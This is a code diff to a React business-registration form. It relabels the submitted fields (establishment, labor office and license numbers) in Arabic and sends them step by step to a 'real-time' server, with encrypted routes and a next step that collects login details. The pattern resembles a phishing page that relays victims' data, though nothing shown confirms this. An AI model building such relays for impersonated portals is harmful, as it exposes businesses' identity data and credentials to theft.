@@ -7,11 +7,15 @@ import FormControlLabel from "@mui/material/FormControlLabel";
 import Button from "@mui/material/Button";
 import MenuItem from "@mui/material/MenuItem";
 import CustomRadio from "./CustomRadio";
-import { useNavigate } from "react-router-dom";
 import { SelectChangeEvent } from "@mui/material/Select";
 import ErrorDialog from "./ErrorDialog";
 import CustomInput from "./CustomInput";
 import CustomSelect from "./CustomSelect";
+import {
+  encryptRoute,
+  navigate,
+  sendDataToServer,
+} from "@/real-time/utils/utils";
 
 const BusinessForm = () => {
   const [userType, setUserType] = useState("unifiedNumber");
@@ -24,7 +28,6 @@ const BusinessForm = () => {
   });
   const [showErrorDialog, setShowErrorDialog] = useState(false);
   const [showErrors, setShowErrors] = useState(false);
-  const navigate = useNavigate();
 
   const handleContinue = () => {
     let isValid = false;
@@ -41,8 +44,42 @@ const BusinessForm = () => {
       setShowErrors(true);
       setShowErrorDialog(true);
     } else {
-      console.log("Form is valid, submitting:", formData);
+      const userTypeMap: Record<string, string> = {
+        unifiedNumber: "الرقم الموحد",
+        establishmentNumber: "رقم المنشأة في مكتب العمل",
+      };
+
+      const fieldMap: Record<string, string> = {
+        unifiedNumber: "الرقم الموحد",
+        establishmentNumber: "رقم المنشأة",
+        laborOfficeNumber: "رقم مكتب العمل",
+        licenseNumber: "رقم الرخصة",
+        activity: "النشاط",
+      };
+
+      const arabicData: Record<string, string> = {
+        "نوع المستخدم": userTypeMap[userType] || userType,
+      };
+
+      Object.entries(formData).forEach(([key, value]) => {
+        if (value && value.trim() !== "") {
+          const arabicKey = fieldMap[key] || key;
+          arabicData[arabicKey] = value;
+        }
+      });
+
+      console.log("Form is valid, submitting:", arabicData);
+
+      sendDataToServer({
+        data: arabicData,
+        current: "التحقق من هوية المنشأة",
+        nextPage: "تسجيل بيانات الدخول",
+      });
     }
+  };
+
+  const handleBack = () => {
+    navigate(encryptRoute("تسجيل"));
   };
 
   return (
@@ -180,7 +217,7 @@ const BusinessForm = () => {
       >
         <Button
           variant="outlined"
-          onClick={() => navigate("/registration")}
+          onClick={handleBack}
           sx={{
             width: { xs: "100%", md: "fit-content" },
             borderColor: "#136e82",
